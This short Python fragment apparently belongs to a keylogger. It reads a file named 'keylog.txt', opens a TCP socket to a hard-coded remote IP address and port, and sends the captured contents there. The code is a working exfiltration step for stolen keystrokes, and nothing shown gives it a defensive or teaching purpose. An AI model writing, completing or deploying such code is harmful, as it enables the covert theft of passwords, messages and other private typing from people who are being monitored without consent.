#=============================================
#sending txt file

f = open('keylog.txt', 'r')
strf = str(f.read())
print(strf)
eggs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
eggs.connect(('107.170.79.196', 9010))
eggs.sendall(strf)

print("done")
